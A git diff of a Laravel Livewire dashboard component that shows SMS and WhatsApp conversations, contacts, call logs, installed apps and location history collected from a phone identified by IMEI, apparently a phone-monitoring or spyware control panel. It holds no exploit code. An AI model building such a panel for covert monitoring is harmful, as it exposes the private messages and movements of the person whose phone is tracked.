@@ -4,110 +4,105 @@ namespace App\Http\Livewire\Client;
 
 use Livewire\Component;
 use Auth;
-use App\Models\Browser;
 use App\Models\Contact;
 use App\Models\ContactLog;
-use App\Models\Facebook;
-use App\Models\Phone;
-use App\Models\Simcard;
 use App\Models\Sms;
 use App\Models\SocialApp;
 use App\Models\App;
-use App\Models\Whatsapp;
+use App\Models\Location;
+use DB;
 
 class Home extends Component
 {
     public $phoneImei;
+    public $menu;
+    public $subMenu;
 
-    public $whatsapp = false;
-    public $sms = false;
-    public $home = false;
     // data
     public $smsList = [];
+    public $smsConversationList = [];
+    public $selectedSmsConversation;
+
     public $appsList = [];
     public $contactList = [];
     public $callLogList = [];
     public $deviceList = [];
     public $locationList = [];
+
     public $whatsappList = [];
+    public $whatsappConversationList = [];
+    public $selectedWhatsappConversation;
 
-    public function showWhatsapp($imei) {
+    public function showWhatsapp() {
         $this->resetChoice();
-        $this->whatsappList = SocialApp::where(['imei'=>$imei,'platform'=>'whatsapp'])->orderBy('date','asc')->get();
-        $this->whatsapp = true;
+        $this->menu = '7';
+        $this->whatsappList = SocialApp::latest('date')->where(['imei'=>$this->phoneImei,'platform'=>'whatsapp'])->get()->unique('contact');
+        $this->selectedWhatsappConversation = $this->whatsappList->toArray()[0]["contact"];
+        $this->whatsappConversationList = SocialApp::where(['imei'=>$this->phoneImei,'platform'=>'whatsapp','contact'=> $this->selectedWhatsappConversation])->get();
 
-
     }
-    public function showSms($imei) {
+    public function showWhatsappConversation($contact) {
+        $this->selectedWhatsappConversation = $contact;
+        $this->whatsappConversationList = SocialApp::where(['imei'=>$this->phoneImei,'platform'=>'whatsapp','contact'=> $contact])->get();
+    }
+    public function showSms() {
         $this->resetChoice();
-        $this->sms = true;
-        $this->smsList = Sms::where('imei',$imei)->get();
+        $this->menu = '1';
+        $this->smsList = Sms::latest('date')->where('imei',$this->phoneImei)->get()->unique('contact');
+        $this->selectedSmsConversation = $this->smsList->toArray()[0]["contact"];
+        $this->smsConversationList = Sms::where(['imei'=>$this->phoneImei,'contact'=>$this->selectedSmsConversation])->get();
     }
-    public function showTwitter($imei) {
+    public function showSmsConversation($contact) {
+        $this->selectedSmsConversation = $contact;
+        $this->smsConversationList = Sms::where(['imei'=>$this->phoneImei,'contact'=>$this->selectedSmsConversation])->get();
+    }
+    public function showTwitter() {
         $this->resetChoice();
-        $this->twitter = true;
     }
-    public function showContacts($imei) {
+    public function showContacts() {
         $this->resetChoice();
-        $this->contacts = true;
-        $this->contactList = Contact::where('imei',$imei)->get();
+        $this->menu = '2';
+        $this->contactList = Contact::where('imei',$this->phoneImei)->get();
     }
-    public function showCallLogs($imei) {
+    public function showCallLogs() {
         $this->resetChoice();
-        $this->callLogs = true;
-        $this->callLogList = ContactLog::where('imei',$imei)->get();
+        $this->menu = '3';
+        $this->callLogList = ContactLog::where('imei',$this->phoneImei)->orderBy("date","DESC")->get();
     }
-    public function showDashboard($imei) {
+    public function showDashboard() {
         // get all regquired adat from db
         $this->resetChoice();
-        $this->dashboard = true;
+        $this->menu = '0';
     }
-    public function showApps($imei) {
+    public function showApps() {
         $this->resetChoice();
-        $this->apps = true;
-        $this->appsList = App::where('imei','$imei')->get();
+        $this->menu = '4';
+        $this->appsList = App::where('imei',$this->phoneImei)->get();
     }
-    public function showLocation($imei) {
+    public function showLocation() {
         $this->resetChoice();
-        $this->location = true;
+        $this->menu = '6';
+        $this->locationList = Location::where('imei',$this->phoneImei)->pluck('latitude','longitude');
+        // dd($this->locationList);
     }
 
 
     private function resetChoice() {
-        $this->sms = false;
-        $this->dashboard = false;
-        $this->apps = false;
-        $this->callLogs = false;
-        $this->whatsapp = false;
-        $this->facebook = false;
-        $this->instagram = false;
-        $this->twitter = false;
-        $this->telegram = false;
-        $this->chrome = false;
-        $this->brave = false;
-        $this->tor = false;
-        $this->phoenix = false;
-        $this->ducduckgo = false;
 
         //reset data entry
-        $this->reset(['smsList','appsList','contactList','callLogList','deviceList','locationList','whatsappList']);
+        $this->reset(['smsConversationList','whatsappConversationList','smsList','appsList','contactList','callLogList','deviceList','locationList','whatsappList']);
     }
 
     public function render()
     {
-        if($this->sms){
-            return view('livewire.client.sms.index',[
-                'phones' => \App\Models\Phone::where('mobile_access_token',Auth::user()->mobile_access_token)->get(),
-            ]);
-        }elseif($this->whatsapp){
-            return view('livewire.client.whatsapp.index',[
-                'phones' => \App\Models\Phone::where('mobile_access_token',Auth::user()->mobile_access_token)->get(),
-            ]);
-        }else{
-            return view('livewire.client.home',[
-                'phones' => \App\Models\Phone::where('mobile_access_token',Auth::user()->mobile_access_token)->get(),
-            ]);
+        $tokens = Auth::user()->mobileAccessToken;
+        $tmphones = [];
+        foreach($tokens as $token){
+            array_push($tmphones,$token->phone);
         }
-
+ 
+        return view('livewire.client.home',[
+            'phones' => $tmphones,
+        ]);
     }
 }
